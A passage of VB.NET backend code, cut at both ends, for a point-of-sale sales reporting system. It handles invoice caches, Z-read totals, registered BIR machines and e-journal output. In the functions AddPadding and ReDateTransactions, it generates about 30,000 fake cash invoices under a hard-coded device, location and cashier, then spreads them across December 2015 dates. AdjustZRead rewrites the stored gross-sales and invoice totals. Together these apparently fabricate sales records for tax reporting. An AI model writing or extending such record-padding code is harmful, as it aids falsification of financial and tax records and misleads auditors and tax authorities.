            dtDateFrom = Convert.ToDateTime(Common.WebRequest.Data("DateFrom"))
            dtDateto = Convert.ToDateTime(Common.WebRequest.Data("DateTo"))
            FOWSTID = CStr2(Common.WebRequest.Data("LocationID"))
            DeviceID = CStr2(Common.WebRequest.Data("DeviceID"))

            MIN = CStr2(Common.WebRequest.Data("MIN"))

            dtAuditTrail2 = GetRawDataFromSalesInvoiceAndRebatesCache(True, dtDateFrom, dtDateto, FOWSTID, DeviceID)


            strReturn = JsonDictionary.Serialize("ReportPOS", clsSalesReport.getEJournal(dtZRead, dtAuditTrail2, MIN))

            Return strReturn
        End Function

        Function GetRawDataFromSalesInvoiceAndRebatesCache(IsInvoiceOnly As Boolean, dateFrom As String, dateTo As String, FOWSTID As String, Optional DeviceID As String = "") As DataTable
            Dim pSql As String
            Dim dtTemp As DataTable

            If Not CStr2(Common.WebRequest.Data("DeviceID")) = "" Then
                DeviceID = CStr2(Common.WebRequest.Data("DeviceID"))
            End If

            pSql = "Select * from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                    "WHERE convert(date, TransactionDate) BETWEEN " & ReadyString(dateFrom) & " AND " & ReadyString(dateTo) & vbCrLf &
                    " AND TransSalesInvoiceAndRebatesCache.FOWSTID = " & ReadyString(FOWSTID) & " AND TransSalesInvoiceAndRebatesCache.DeviceID=" & ReadyString(DeviceID) & vbCrLf

            AppendToDebug(pSql)
            '" INNER JOIN TransZReadCache on convert(date, TransactionDate) = convert(date, SalesDate) AND " & vbCrLf &
            '        " TransSalesInvoiceAndRebatesCache.FOWSTID = TransZReadCache.FOWSTID AND  " & vbCrLf &
            '        " TransSalesInvoiceAndRebatesCache.DeviceID = TransZReadCache.DeviceID  " & vbCrLf &

            If IsInvoiceOnly Then
                pSql &= " AND TransactionType = 'Invoice'" & vbCrLf
            End If

            pSql &= " ORDER BY TransactionDate DESC"

            dtTemp = Common.WebRequest.ProData.Execute(pSql)

            Return dtTemp
        End Function

        Function SaveTransSalesInvoiceAndRebatesHeader(dtAuditTrail As DataTable, FOWSTID As String, MonthYear As String, TargetESales As Double) As String
            Dim pSql As String
            Dim p As New InsertUpdate("TransSalesInvoiceAndRebatesHeader")
            Dim SIFrom As Integer
            Dim SITo As Integer
            Dim ID As String
            Dim mMonthYear As Date

            mMonthYear = CDate(MonthYear)

            pSql = "Select ID from TransSalesInvoiceAndRebatesHeader " & vbCrLf &
                    "WHERE Month(TransactionMonthYear)= " & mMonthYear.Month & vbCrLf &
                    " AND Year(TransactionMonthYear)= " & mMonthYear.Year & vbCrLf &
                    " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(FOWSTID)

            ID = CStr2(Common.WebRequest.ProData.ExecuteScalar(pSql))

            If dtAuditTrail.Rows.Count > 0 Then
                p("DeviceID") = ReadyString(CStr2(Common.WebRequest.Data("DeviceID")))
                p("FOWSTID") = ReadyString(FOWSTID)
                p("TransactionMonthYear") = ReadyString(dtAuditTrail.Rows(0).Item("TransactionDate"))

                dtAuditTrail.DefaultView.Sort = "TransactionNo ASC"
                SIFrom = CInt2(dtAuditTrail.DefaultView.ToTable.Rows(0).Item("TransactionNo"))
                p("SIFrom") = SIFrom

                dtAuditTrail.DefaultView.Sort = "TransactionNo DESC"
                SITo = CInt2(dtAuditTrail.DefaultView.ToTable.Rows(0).Item("TransactionNo"))
                p("SITo") = SITo

                If ID.Length > 0 Then
                    'p("TargetPercentage") = ReadyString(TargetESales / dtAuditTrail.Compute("SUM(SubTotal)", ""))
                    'p("TargetValue") = ReadyString(TargetESales)

                    pSql = p.GetUpdate("ID = " & ReadyString(ID))
                Else
                    ID = Guid.NewGuid.ToString
                    p("ID") = ReadyString(ID)
                    p("OriginalValue") = ReadyString(dtAuditTrail.Compute("SUM(SubTotal)", ""))
                    pSql = p.GetInsert()
                End If
            Else
                p("DeviceID") = ReadyString(CStr2(Common.WebRequest.Data("DeviceID")))
                p("FOWSTID") = ReadyString(FOWSTID)
                p("TransactionMonthYear") = ReadyString(mMonthYear)

                SIFrom = 0
                p("SIFrom") = SIFrom

                SITo = 0
                p("SITo") = SITo

                If ID.Length > 0 Then
                    p("TargetPercentage") = 0
                    p("TargetValue") = 0

                    pSql = p.GetUpdate("ID = " & ReadyString(ID))
                Else
                    ID = Guid.NewGuid.ToString
                    p("ID") = ReadyString(ID)
                    p("OriginalValue") = 0
                    pSql = p.GetInsert()
                End If
            End If


            Try
                Common.WebRequest.ProData.Execute(pSql)
            Catch ex As Exception
                Return ""
            End Try

            Return ID

        End Function

        Function SaveTransSalesInvoiceAndRebatesCache(dtAuditTrail As DataTable, FOWSTID As String) As Boolean
            Dim pSql As String

            For i As Integer = 0 To dtAuditTrail.Rows.Count - 1
                Dim p As New InsertUpdate("TransSalesInvoiceAndRebatesCache")

                p("FOWSTID") = ReadyString(FOWSTID)
                p("DeviceID") = ReadyString(CStr2(Common.WebRequest.Data("DeviceID")))
                p("TransactionID") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("ID")))
                p("TransactionType") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("TransactionType")))
                p("Customer") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("Customer")))
                p("CashierName") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("CashierName")))
                p("ProductNo") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("ProductNo")))
                p("ProductName") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("ProductName")))
                p("TransactionNo") = CInt(dtAuditTrail.Rows(i).Item("TransactionNo"))
                p("TransactionDate") = ReadyString(CStr2(dtAuditTrail.Rows(i).Item("TransactionDate")))
                p("Quantity") = CDec2(dtAuditTrail.Rows(i).Item("Quantity"))
                p("UnitMeasure") = ReadyString(dtAuditTrail.Rows(i).Item("UnitMeasure"))
                p("UnitPrice") = CDec2(dtAuditTrail.Rows(i).Item("UnitPrice"))
                p("SubTotal") = CDec2(dtAuditTrail.Rows(i).Item("SubTotal"))
                p("DiscountAmount") = CDec2(dtAuditTrail.Rows(i).Item("DiscountAmount"))
                p("DiscountedUnitPrice") = CDec2(dtAuditTrail.Rows(i).Item("DiscountedUnitPrice"))
                p("DiscountedSubTotal") = CDec2(dtAuditTrail.Rows(i).Item("DiscountedSubTotal"))
                p("CashAmount") = CDec2(dtAuditTrail.Rows(i).Item("CashAmount"))
                p("CheckPaymentAmount") = CDec2(dtAuditTrail.Rows(i).Item("CheckPaymentAmount"))
                p("DebitCardAmount") = CDec2(dtAuditTrail.Rows(i).Item("DebitCardAmount"))
                p("CreditCardAmount") = CDec2(dtAuditTrail.Rows(i).Item("CreditCardAmount"))
                p("SRVAmount") = CDec2(dtAuditTrail.Rows(i).Item("SRVAmount"))

                'If CType(pObj, Dictionary(Of String, Object)).ContainsKey("OnCreditAmount") Then
                p("OnCreditAmount") = CDec2(dtAuditTrail.Rows(i).Item("OnCreditAmount"))
                'Else
                'p("OnCreditAmount") = 0
                'End If

                p("OtherTypeAmount") = CDec2(dtAuditTrail.Rows(i).Item("OtherTypeAmount"))
                p("VATPercent") = CDec2(dtAuditTrail.Rows(i).Item("VATPercent"))
                p("VatableSales") = CDec2(dtAuditTrail.Rows(i).Item("VatableSales"))
                p("VATAmount") = CDec2(dtAuditTrail.Rows(i).Item("VATAmount"))
                p("CustomerChangeCash") = CDec2(dtAuditTrail.Rows(i).Item("CustomerChangeCash"))

                pSql = p.GetInsert()

                Try
                    Common.WebRequest.ProData.Execute(pSql)
                Catch ex As Exception
                    Return False
                End Try
            Next

            Return True

        End Function

        Function GetTransSalesInvoiceAndRebatesHeader() As DataTable
            Dim pSql As String
            Dim dtTemp As DataTable
            Dim dtDateFrom As DateTime
            Dim dtDateto As DateTime
            Dim FOWSTID As String

            dtDateFrom = Convert.ToDateTime(Common.WebRequest.Data("DateFrom"))
            dtDateto = Convert.ToDateTime(Common.WebRequest.Data("DateTo"))
            FOWSTID = CStr2(Common.WebRequest.Data("FOWSTID"))


            pSql = "Select * from TransSalesInvoiceAndRebatesHeader " & vbCrLf &
                    "WHERE Month(TransactionMonthYear) = " & ReadyString(dtDateFrom) & vbCrLf &
                    " AND YEAR(TransactionMonthYear) = " & ReadyString(dtDateto) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(FOWSTID) & vbCrLf &
                    " AND DeviceID=" & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf

            pSql &= " ORDER BY TransactionMonthYear"

            dtTemp = Common.WebRequest.ProData.Execute(pSql)

            Return dtTemp
        End Function

        'Function SaveTransSalesInvoiceAndRebatesHeader() As DataTable
        '    Dim pSql As String
        '    Dim dtTemp As DataTable
        '    Dim dtDateFrom As DateTime
        '    Dim dtDateto As DateTime
        '    Dim FOWSTID As String
        '    Dim pDT As DataTable

        '    dtDateFrom = Convert.ToDateTime(Common.WebRequest.Data("DateFrom"))
        '    dtDateto = Convert.ToDateTime(Common.WebRequest.Data("DateTo"))
        '    FOWSTID = CStr2(Common.WebRequest.Data("FOWSTID"))

        '    For Each pObj As Object In Common.WebRequest.AllData("ZReadData")

        '        pSql = "Select * from TransSalesInvoiceAndRebatesHeader where ID = " & ReadyString(CStr2(pObj("ID")))

        '        pDT = Common.WebRequest.ProData.Execute(pSql)


        '        Dim p As New InsertUpdate("TransSalesInvoiceAndRebatesCache")

        '        p("FOWSTID") = ReadyString(FOWSTID)


        '        If pDT.Rows.Count > 0 Then
        '            pSql = p.GetInsert()
        '        Else
        '            pSql = p.GetUpdate("ID = " & ReadyString(CStr2(pObj("ID"))))
        '        End If

        '        Try
        '            Common.WebRequest.ProData.Execute(pSql)
        '        Catch ex As Exception
        '            AppendToDebug("vsMXWE4SRNRM!", , ex, True)
        '        End Try
        '    Next

        'End Function

        Function GetDataHeader() As String
            Dim pSql As String
            Dim mMonthYear As Date
            Dim dt As DataTable
            Dim strReturn As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            mMonthYear = CDate(Common.WebRequest.Data("DateFrom"))

            pSql = "Select * from TransSalesInvoiceAndRebatesHeader " & vbCrLf &
                    "WHERE Month(TransactionMonthYear)= " & mMonthYear.Month & vbCrLf &
                    " AND Year(TransactionMonthYear)= " & mMonthYear.Year & vbCrLf &
                    " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(Common.WebRequest.Data("FOWSTID"))

            dt = Common.WebRequest.ProData.Execute(pSql)

            strReturn = JsonDictionary.Serialize("ReportPOS", dt)

            Return strReturn

        End Function

        Function TagUntagMonthsData() As String
            Dim pSql As String
            Dim strReturn As String
            Dim mMonth As Integer
            Dim mYear As Integer

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            mYear = CInt2(Common.WebRequest.Data("Year"))
            mMonth = CInt2(Common.WebRequest.Data("Month"))

            pSql = "Update TransSalesInvoiceAndRebatesHeader set " & vbCrLf &
                    "DoNotModify = " & CInt2(Common.WebRequest.Data("IsTag")) & vbCrLf &
                    "WHERE Month(TransactionMonthYear)= " & mMonth & vbCrLf &
                    " AND Year(TransactionMonthYear)= " & mYear & vbCrLf &
                    " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(Common.WebRequest.Data("FOWSTID"))

            Common.WebRequest.ProData.Execute(pSql)

            pSql = "Update TransSalesInvoiceAndRebatesCache set " & vbCrLf &
                    "DoNotModify = " & CInt2(Common.WebRequest.Data("IsTag")) & vbCrLf &
                    "WHERE Month(TransactionDate)= " & mMonth & vbCrLf &
                    " AND Year(TransactionDate)= " & mYear & vbCrLf &
                    " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(Common.WebRequest.Data("FOWSTID"))

            Common.WebRequest.ProData.Execute(pSql)

        End Function

        Function GetRegisteredDevices() As String
            Dim pSql As String
            Dim mMonthYear As Date
            Dim dt As DataTable
            Dim strReturn As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            pSql = "SELECT " & vbCrLf &
            "LibraryDeviceFowst.ID " & vbCrLf &
            ",LibraryDevice.ID DeviceID" & vbCrLf &
            ",LibraryDevice.PhoneName PhoneName" & vbCrLf &
            ",MobizLibraryOrganizationFOWST.ID FOWSTID" & vbCrLf &
            ",MobizLibraryOrganizationFOWST.Name Location" & vbCrLf &
            ",LibraryDeviceFowst.BIRMachineNo BIRMachineNo" & vbCrLf &
            ",LibraryDeviceFowst.POSRegistrationNo RegistrationNo" & vbCrLf &
            ",LibraryDeviceFowst.ApplicationDate ApplicationDate" & vbCrLf &
            "FROM LibraryDeviceFowst" & vbCrLf &
            "INNER JOIN LibraryDevice on LibraryDevice.ID = LibraryDeviceFowst.DeviceID" & vbCrLf &
            "INNER JOIN MobizLibraryOrganizationFOWST on MobizLibraryOrganizationFOWST.ID = LibraryDeviceFowst.FowstID" & vbCrLf &
            "WHERE BIRMachineNo <> 'null'"

            dt = Common.WebRequest.ProData.Execute(pSql)

            strReturn = JsonDictionary.Serialize("ReportPOS", dt)

            Return strReturn
        End Function

        Function AddPadding() As String
            Dim pSql As String
            Dim mMonthYear As String
            Dim FOWSTID As String
            Dim DeviceID As String
            Dim TransactionDate As String
            Dim ProductName() As String = {"PANDA, BALLPEN, Crystal Black, (25 pcs/inner)",
                                           "GENIUS, PAD, Quiz 1/2 Cross-wise, (200/case)",
                                            "OISHI, FOOD, PINATTSU GARLIC & SALT, 100 pc/CASE 32grams",
                                            "CLASSIC, ENVELOPE, Plain White Short, 6-3/4x, (25/pack;500/box)",
                                            "FUJI, STATIONERY/ CELLOPHANE/ SCOTCH TAPE, Big Core/ Yellow, 1/2""x80y, (529",
                                            "KID ART, CRAYON, non-toxic, 16's",
                                            "CLASSIC, ENVELOPE, Plain White Short, 6-3/4x, (25/pack;500/box)",
                                            "[No Brand], ERASER, Rubber ABC Alphabet"}

            Dim UnitPrice() As Double = {"1.09", "1.68", "2.24", "1.24", "2.67", "4.41", "1.60", "0.30"}
            Dim FinalUnitPrice As Double
            Dim Qty As Integer
            Dim rndProductCount As Integer
            Dim rndProduct As Integer
            Dim rndQty As Integer
            Dim TransactionNo As Integer
            Dim TotalAmount As Double
            Dim TotalAmountRoundedToCeiling As Double
            Dim Change As Double
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            FOWSTID = "a38ca176-c692-4251-b485-991a7aeef22b"
            DeviceID = "96c5b9b5-d2a2-4a52-b147-696bd4c10b78"
            TransactionDate = "12/31/2015"
            TransactionNo = 104667

            For i = TransactionNo To 134652

                rndProductCount = CInt(Math.Ceiling(Rnd() * 2))

                'random number of transaction
                For x As Integer = 1 To rndProductCount
                    rndProduct = CInt(Math.Ceiling(Rnd() * 7))
                    rndQty = CInt(Math.Ceiling(Rnd() * 2)) + 1
                    TotalAmount = UnitPrice(rndProduct) * rndQty
                    TotalAmountRoundedToCeiling = (Math.Ceiling(TotalAmount / 1) * 1)
                    Change = TotalAmountRoundedToCeiling - TotalAmount

                    Dim p As New InsertUpdate("TransSalesInvoiceAndRebatesCache")

                    p("FOWSTID") = ReadyString(FOWSTID)
                    p("DeviceID") = ReadyString(DeviceID)
                    p("TransactionID") = ReadyString(Guid.NewGuid.ToString)
                    p("TransactionType") = ReadyString("Invoice")
                    p("Customer") = ReadyString("[CASH PAYMENT]")
                    p("CashierName") = ReadyString("gonzales, elsie mae miag ao")
                    p("ProductNo") = ReadyString("-")
                    p("ProductName") = ReadyString(ProductName(rndProduct))
                    p("TransactionNo") = i
                    p("TransactionDate") = ReadyString(TransactionDate)
                    p("Quantity") = rndQty
                    p("UnitMeasure") = ReadyString("Piece")
                    p("UnitPrice") = UnitPrice(rndProduct)
                    p("SubTotal") = TotalAmount
                    p("DiscountAmount") = 0
                    p("DiscountedUnitPrice") = 0
                    p("DiscountedSubTotal") = 0
                    p("CashAmount") = TotalAmountRoundedToCeiling
                    p("CheckPaymentAmount") = 0
                    p("DebitCardAmount") = 0
                    p("CreditCardAmount") = 0
                    p("SRVAmount") = 0

                    'If CType(pObj, Dictionary(Of String, Object)).ContainsKey("OnCreditAmount") Then
                    p("OnCreditAmount") = 0
                    'Else
                    'p("OnCreditAmount") = 0
                    'End If

                    p("OtherTypeAmount") = 0
                    p("VATPercent") = 12
                    p("VatableSales") = CDec2(TotalAmount / 1.12)
                    p("VATAmount") = CDec2(TotalAmount - (TotalAmount / 1.12))
                    p("CustomerChangeCash") = Change

                    pSql = p.GetInsert()

                    Try
                        Common.WebRequest.ProData.Execute(pSql)
                    Catch ex As Exception
                        Return False
                    End Try
                Next

            Next

        End Function

        Function ReDateTransactions() As String
            Dim pSql As String
            Dim mMonthYear As String
            Dim FOWSTID As String
            Dim DeviceID As String
            Dim TransactionDate As String
            Dim MIN As String
            Dim ProductName() As String = {"PANDA, BALLPEN, Crystal Black, (25 pcs/inner)",
                                           "GENIUS, PAD, Quiz 1/2 Cross-wise, (200/case)",
                                            "OISHI, FOOD, PINATTSU GARLIC & SALT, 100 pc/CASE 32grams",
                                            "CLASSIC, ENVELOPE, Plain White Short, 6-3/4x, (25/pack;500/box)",
                                            "FUJI, STATIONERY/ CELLOPHANE/ SCOTCH TAPE, Big Core/ Yellow, 1/2""x80y, (529",
                                            "KID ART, CRAYON, non-toxic, 16's",
                                            "CLASSIC, ENVELOPE, Plain White Short, 6-3/4x, (25/pack;500/box)",
                                            "[No Brand], ERASER, Rubber ABC Alphabet"}

            Dim UnitPrice() As Double = {"1.09", "1.68", "2.24", "1.24", "2.67", "4.41", "1.60", "0.30"}
            Dim FinalUnitPrice As Double
            Dim Qty As Integer
            Dim rndProductCount As Integer
            Dim rndProduct As Integer
            Dim rndQty As Integer
            Dim TransactionNo As Integer
            Dim TotalAmount As Double
            Dim TotalAmountRoundedToCeiling As Double
            Dim Change As Double

            Dim pDTTransactionData As DataTable
            Dim TransPerDay As Integer
            Dim DayToday As Integer

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            MIN = CStr2(Common.WebRequest.Data("MIN"))

            pSql = "select ID from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                    "where " & vbCrLf &
                    "DeviceID = '96c5b9b5-d2a2-4a52-b147-696bd4c10b78' " & vbCrLf &
                    "and FOWSTID = 'a38ca176-c692-4251-b485-991a7aeef22b' " & vbCrLf &
                    "and MONTH(TransactionDate) = 12 " & vbCrLf &
                    "and YEAR(TransactionDate) = 2015 " & vbCrLf &
                    "and TransactionType = 'Invoice' " & vbCrLf &
                    "Order By TransactionNo"

            pDTTransactionData = Common.WebRequest.ProData.Execute(pSql)

            TransPerDay = pDTTransactionData.Rows.Count / 24
            DayToday = 0

            For i = 0 To pDTTransactionData.Rows.Count - 1

                If (i Mod TransPerDay) = 0 Then

                    If Not DayToday = 30 Then
                        DayToday += 1

                        While DayToday = 6 OrElse
                              DayToday = 13 OrElse
                              DayToday = 20 OrElse
                              DayToday = 24 OrElse
                              DayToday = 25 OrElse
                              DayToday = 26

                            DayToday += 1
                        End While
                    End If

                End If

                pSql = "Update TransSalesInvoiceAndRebatesCache set TransactionDate = '12/" & DayToday & "/2015' WHERE ID = " & ReadyString(CStr2(pDTTransactionData.Rows(i).Item("ID")))
                Common.WebRequest.ProData.Execute(pSql)

            Next

            Dim dtZRead As DataTable
            Dim dtAuditTrail As DataTable
            Dim clsSalesReport As New ReportPOS

            pSql = "select * from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                   "where " & vbCrLf &
                   "DeviceID = '96c5b9b5-d2a2-4a52-b147-696bd4c10b78' " & vbCrLf &
                   "and FOWSTID = 'a38ca176-c692-4251-b485-991a7aeef22b' " & vbCrLf &
                   "and MONTH(TransactionDate) = 12 " & vbCrLf &
                   "and YEAR(TransactionDate) = 2015 " & vbCrLf &
                   "and TransactionType = 'Invoice' " & vbCrLf &
                   "Order By TransactionNo"

            dtAuditTrail = Common.WebRequest.ProData.Execute(pSql)

            clsSalesReport.getEJournal(dtZRead, dtAuditTrail, MIN)

        End Function


        Function GenerateMonthlyTransaction() As String
            Dim pSql As String

            Dim dtZRead As DataTable
            Dim dtAuditTrail As DataTable
            Dim clsSalesReport As New ReportPOS
            Dim MIN As String

            MIN = CStr2(Common.WebRequest.Data("MIN"))

            pSql = "select * from TransSalesInvoiceAndRebatesCache " & vbCrLf &
                   "where " & vbCrLf &
                   "DeviceID = '96c5b9b5-d2a2-4a52-b147-696bd4c10b78' " & vbCrLf &
                   "and FOWSTID = 'a38ca176-c692-4251-b485-991a7aeef22b' " & vbCrLf &
                   "and MONTH(TransactionDate) = 12 " & vbCrLf &
                   "and YEAR(TransactionDate) = 2015 " & vbCrLf &
                   "Order By TransactionNo, TransactionDate"

            dtAuditTrail = Common.WebRequest.ProData.Execute(pSql)

            clsSalesReport.getEJournal(dtZRead, dtAuditTrail, MIN)

        End Function

        Function AdjustZReadData(ZDate As Date, GrossAmount As Double, Device As String, FOWSTID As String)
            Dim pSql As String
            Dim pDTZReadDate As DataTable
            Dim CurGrossSales As Double
            Dim PrevGrossSales As Double

            pSql = "Select * from TransZReadCache " & vbCrLf &
                    "WHERE convert(date,SalesDate) >= " & ReadyString(ZDate) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(FOWSTID) & " AND DeviceID=" & ReadyString(Device) & vbCrLf &
                    " ORDER BY SalesDate"

            pDTZReadDate = Common.WebRequest.ProData.Execute(pSql)

            If pDTZReadDate.Rows.Count > 0 Then

                pSql = "Update TransZReadCache set PresentationCurrGrossSales = " & GrossAmount & "  WHERE ID = " & ReadyString(CStr2(pDTZReadDate.Rows(0).Item("ID")))

                Common.WebRequest.ProData.Execute(pSql)

                CurGrossSales = GrossAmount

                PrevGrossSales = CurGrossSales + CDec2(pDTZReadDate.Rows(0).Item("PresentationPrevGrossSales"))

                For i As Integer = 1 To pDTZReadDate.Rows.Count - 1

                    pSql = "Update TransZReadCache set PresentationPrevGrossSales = " & PrevGrossSales & " WHERE ID = " & ReadyString(CStr2(pDTZReadDate.Rows(i).Item("ID")))

                    Common.WebRequest.ProData.Execute(pSql)

                    PrevGrossSales += CDec2(pDTZReadDate.Rows(i).Item("PresentationCurrGrossSales"))

                Next

            End If
        End Function

        Public Function GetZRead() As String
            Dim pSql As String
            Dim dt As DataTable
            Dim strReturn As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            pSql = "Select * from TransZReadCache " & vbCrLf &
                    "WHERE DeviceID = " & ReadyString(Common.WebRequest.Data("DeviceID")) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(Common.WebRequest.Data("LocationID")) & vbCrLf &
                    " AND convert(date,SalesDate) between  " & ReadyString(Common.WebRequest.Data("DateFrom")) & " AND " & ReadyString(Common.WebRequest.Data("DateTo")) & vbCrLf &
                    " ORDER BY SalesDate ASC"

            dt = Common.WebRequest.ProData.Execute(pSql)

            strReturn = JsonDictionary.Serialize("ReportPOS", dt)

            Return strReturn

        End Function

        Public Function UpdateZReadReportedDay() As String
            Dim pSql As String
            Dim dt As DataTable
            Dim strReturn As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            pSql = "Update TransZReadCache set IsReported = " & CInt2(Common.WebRequest.Data("IsReported")) & vbCrLf &
                    " WHERE ID = " & ReadyString(CStr2(Common.WebRequest.Data("ID")))

            dt = Common.WebRequest.ProData.Execute(pSql)

            strReturn = JsonDictionary.Serialize("ReportPOS", "True")

            Return strReturn

        End Function

        Public Function AdjustZRead() As String
            Dim pSql As String
            Dim PreviousZReadDate As Date
            Dim PreviousZReadData As DataTable
            Dim CurrentSales As DataTable
            Dim DateFrom As Date
            Dim DateTo As Date
            Dim dt As DataTable
            Dim strReturn As String


            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            DateFrom = CDate(CStr2(Common.WebRequest.Data("DateFrom")))
            DateTo = CDate(CStr2(Common.WebRequest.Data("DateTo")))

            PreviousZReadDate = DateFrom.AddDays(-1)

            While DateFrom <= DateTo

                'get previous z-read
                pSql = "Select top 1 * from TransZReadCache " & vbCrLf &
                        "where convert(date,SalesDate) < " & ReadyString(DateFrom) & vbCrLf &
                        " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                        " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf &
                        " ORDER BY SalesDate desc"
                PreviousZReadData = Common.WebRequest.ProData.Execute(pSql)

                'get current sales, discount, beginning and ending invoice
                pSql = "Select SUM(SubTotal) TotalSales, SUM(DiscountAmount) TotalDiscount, MIN(TransactionNo) StartingInvoice, MAX(TransactionNo) EndingInvoice " & vbCrLf &
                        " from  TransSalesInvoiceAndRebatesCache where TransactionType = 'Invoice'  " & vbCrLf &
                        " and convert(date,TransactionDate) = " & ReadyString(CStr2(DateFrom)) & vbCrLf &
                        " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                        " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf

                CurrentSales = Common.WebRequest.ProData.Execute(pSql)

                'update z-read 
                If CDec2(CurrentSales.Rows(0).Item("TotalSales")) > 0 Then
                    pSql = "Update TransZReadCache set " & vbCrLf &
                        "PresentationCurrGrossSales = " & CDec2(CurrentSales.Rows(0).Item("TotalSales")) & vbCrLf &
                        ",CurGrossSales = " & CDec2(CurrentSales.Rows(0).Item("TotalSales")) & vbCrLf &
                        ",CurTotalDiscount = " & CDec2(CurrentSales.Rows(0).Item("TotalDiscount")) & vbCrLf &
                        ",CurBegInvoiceNo = " & CDec2(CurrentSales.Rows(0).Item("StartingInvoice")) & vbCrLf &
                        ",CurEndInvoiceNo = " & CDec2(CurrentSales.Rows(0).Item("EndingInvoice")) & vbCrLf &
                        ",PrevTotalDiscount = " & CDec2(PreviousZReadData.Rows(0).Item("PrevTotalDiscount")) + CDec2(PreviousZReadData.Rows(0).Item("CurTotalDiscount")) & vbCrLf &
                        ",PresentationPrevGrossSales = " & CDec2(PreviousZReadData.Rows(0).Item("PresentationPrevGrossSales")) + CDec2(PreviousZReadData.Rows(0).Item("CurGrossSales")) & vbCrLf &
                        " WHERE " & vbCrLf &
                        " DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                        " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf &
                        " AND CONVERT(date,SalesDate) = " & ReadyString(CStr2(DateFrom))
                Else
                    pSql = "Update TransZReadCache set " & vbCrLf &
                        "PresentationCurrGrossSales = 0 " & vbCrLf &
                        ",CurGrossSales = 0 " & vbCrLf &
                        ",CurTotalDiscount = 0" & vbCrLf &
                        ",CurBegInvoiceNo = 0" & vbCrLf &
                        ",CurEndInvoiceNo = 0" & vbCrLf &
                        ",PrevTotalDiscount = " & CDec2(PreviousZReadData.Rows(0).Item("PrevTotalDiscount")) + CDec2(PreviousZReadData.Rows(0).Item("CurTotalDiscount")) & vbCrLf &
                        ",PresentationPrevGrossSales = " & CDec2(PreviousZReadData.Rows(0).Item("PresentationPrevGrossSales")) + CDec2(PreviousZReadData.Rows(0).Item("CurGrossSales")) & vbCrLf &
                        " WHERE " & vbCrLf &
                        " DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                        " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf &
                        " AND CONVERT(date,SalesDate) = " & ReadyString(CStr2(DateFrom))
                End If

                Common.WebRequest.ProData.Execute(pSql)

                DateFrom = DateFrom.AddDays(1)
            End While

            dt = Common.WebRequest.ProData.Execute(pSql)

            strReturn = JsonDictionary.Serialize("ReportPOS", "True")

            Return strReturn
        End Function

        Function GetMonthlyZReadTotals() As String
            Dim pSql As String
            Dim DateFrom As Date
            Dim DateTo As Date
            Dim dt As DataTable
            Dim strReturn As String


            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            DateFrom = CDate(CStr2(Common.WebRequest.Data("DateFrom")))
            DateTo = CDate(CStr2(Common.WebRequest.Data("DateTo")))

            pSql = "Select DATENAME(MONTH,SalesDate) Month, YEAR(SalesDate) Year, SUM(CurGrossSales) GrossSales, SUM(CurTotalDiscount) TotalDiscount, SUM(CurSalesReturnExchange) TotalExchange, " & vbCrLf &
                    "Min(CurBegInvoiceNo) StartingInvoice, MAX(CurEndInvoiceNo) EndingInvoice " & vbCrLf &
                    "from TransZReadCache " & vbCrLf &
                    "WHERE DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf &
                    " AND CONVERT(date,SalesDate) between " & ReadyString(CStr2(DateFrom)) & " AND " & ReadyString(CStr2(DateTo)) & vbCrLf &
                    " and CurGrossSales>0 " & vbCrLf &
                    "group by DATENAME(MONTH,SalesDate), YEAR(SalesDate) " & vbCrLf

            dt = Common.WebRequest.ProData.Execute(pSql)

            strReturn = JsonDictionary.Serialize("ReportPOS", dt)

            Return strReturn
        End Function

        Function DownloadESalesData() As String
            Dim pSql As String
            Dim DateFrom As String
            Dim dtESales As New DataTable
            Dim dr As DataRow
            Dim dtSales As DataTable
            Dim filename As String
